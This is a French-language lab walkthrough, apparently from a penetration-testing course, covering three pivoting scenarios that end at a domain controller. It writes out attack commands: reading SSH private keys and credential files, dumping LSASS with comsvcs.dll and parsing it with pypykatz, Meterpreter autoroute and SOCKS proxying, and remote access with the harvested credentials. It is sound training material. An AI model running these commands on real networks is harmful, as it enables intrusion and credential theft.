# Skills Assessment

Trois scenarios de lab qui mettent en pratique toutes les techniques de pivoting vues dans ce module. L'objectif est de partir d'un point d'entree unique et d'atteindre des hotes internes a travers plusieurs pivots successifs, en combinant les outils et les methodes les plus adaptes a chaque situation.

## Scenario 1 : pivot via webshell et SSH

### Situation

Un webshell est accessible sur un serveur web expose. A partir de ce point d'entree, on doit enumerer le reseau interne, decouvrir un hote Windows, y acceder via RDP et recuperer un flag.

### Approche

```bash
# 1 - Depuis le webshell, enumerer le serveur
#     Lister les interfaces reseau pour identifier les sous-reseaux
ip addr
cat /etc/hosts
ls -la /home/

# 2 - Chercher des identifiants sur le serveur
#     Les credentials se trouvent souvent dans les home directories
find /home -name "*.txt" -o -name "*.conf" -o -name ".ssh" 2>/dev/null
cat /home/<user>/.ssh/id_rsa
cat /home/<user>/credentials.txt

# 3 - Obtenir un shell stable (reverse shell ou SSH)
#     Un webshell n'est pas ideal pour pivoter, il faut un shell complet
ssh <user>@<IP_CIBLE> -D 9050
```

### Pivoting vers le reseau interne

```bash
# 4 - Scanner le reseau interne via proxychains
proxychains nmap -sT -Pn 172.16.5.0/24 -p 22,80,135,445,3389,5985

# 5 - Acceder a l'hote Windows decouvert
proxychains xfreerdp /v:172.16.5.x /u:<user> /p:'<password>' /cert:ignore

# 6 - Recuperer le flag
type C:\Flag.txt
```

{% hint style="info" %}
Le webshell est un point d'entree limite. La premiere etape est toujours de passer a un shell complet (reverse shell ou acces SSH) pour avoir la flexibilite necessaire au pivoting.
{% endhint %}

## Scenario 2 : LSASS et rebond multi-hop

### Situation

Depuis le premier pivot Windows, on doit extraire des credentials supplementaires (dump LSASS) pour rebondir vers un deuxieme reseau interne.

### Approche

```powershell
# 1 - Dumper LSASS sur le pivot Windows
#     Utiliser Task Manager, ProcDump, ou rundll32
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full

# 2 - Rapatrier le dump et l'analyser avec pypykatz
pypykatz lsa minidump lsass.dmp
```

L'analyse du dump revele les credentials d'un utilisateur du domaine (session Kerberos avec mot de passe en clair dans certains cas).

```bash
# 3 - Utiliser Meterpreter pour le multi-hop
#     Session 1 : machine d'attaque -> pivot Linux (webshell)
#     Session 2 : pivot Linux -> pivot Windows
#     Ajouter les routes via autoroute

meterpreter > run autoroute -s 172.16.6.0/24
meterpreter > bg

# 4 - Demarrer le proxy SOCKS
use auxiliary/server/socks_proxy
set SRVPORT 9050
run

# 5 - Ping sweep sur le nouveau reseau
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.6.0/24
```

### Acces au deuxieme pivot

```bash
# 6 - RDP ou WinRM vers l'hote decouvert
proxychains xfreerdp /v:172.16.6.x /u:<user_domaine> /p:'<password>' /cert:ignore

# - Ou via evil-winrm
proxychains evil-winrm -i 172.16.6.x -u <user_domaine> -p '<password>'
```

{% hint style="warning" %}
Le dump LSASS necessite des privileges administrateur sur le pivot Windows. Si on n'a qu'un acces utilisateur standard, il faudra d'abord escalader les privileges.
{% endhint %}

## Scenario 3 : atteindre le Domain Controller

### Situation

Le deuxieme pivot Windows est dual-homed (deux interfaces reseau). L'une donne acces au reseau du DC. L'objectif est d'atteindre le DC et recuperer le flag final.

### Approche

```powershell
# 1 - Enumerer les interfaces sur le deuxieme pivot
Get-NetIPConfiguration
ipconfig /all
# On decouvre une interface sur 172.16.10.0/24

# 2 - Identifier le DC (serveur DNS)
nslookup
> set type=all
> _ldap._tcp.dc._msdcs.INLANEFREIGHT.LOCAL

# 3 - Scanner les ports du DC
@(21,22,80,135,443,445,3389,5985) | ForEach-Object {
    $t = New-Object System.Net.Sockets.TcpClient
    $t.ConnectAsync("172.16.10.5", $_).Wait(100)
    if ($t.Connected) { "Port $_ ouvert" }
}
```

### Recuperer le flag

```bash
# 4 - Via evil-winrm (si WinRM est ouvert)
proxychains evil-winrm -i 172.16.10.5 -u <user_domaine> -p '<password>'
type C:\Flag.txt

# 5 - Via SMB (si WinRM n'est pas accessible mais SMB oui)
proxychains smbclient \\\\172.16.10.5\\C$ -U '<DOMAINE>/<user>%<password>'
get Flag.txt
```

{% hint style="success" %}
Toujours enumerer les interfaces reseau sur chaque pivot. Un hote dual-homed est un indicateur fort qu'il peut servir de passerelle vers un nouveau segment reseau.
{% endhint %}

## Ce qu'on en retient

| Etape | Technique | Outil |
|---|---|---|
| Point d'entree | Webshell vers shell stable | Reverse shell, SSH |
| Premier pivot | Dynamic port forwarding | `ssh -D 9050` |
| Credential harvesting | Dump LSASS | ProcDump, pypykatz |
| Multi-hop | Autoroute + SOCKS | Meterpreter, proxychains |
| Scan interne | Port scan via proxy | `proxychains nmap -sT -Pn` |
| Acces distant | RDP, WinRM, SMB | xfreerdp, evil-winrm, smbclient |
| Enumeration reseau | Interfaces, DNS | ipconfig, nslookup |

### Checklist avant de commencer

- [ ] Cartographier les reseaux decouverts (schema avec les IPs et les sauts)
- [ ] Noter chaque credential decouvert (utilisateur, mot de passe, hash, source)
- [ ] Documenter chaque tunnel et route active
- [ ] Verifier les interfaces de chaque pivot pour identifier les reseaux accessibles
- [ ] Tester plusieurs methodes d'acces si la premiere echoue (RDP, WinRM, SMB, SSH)

***
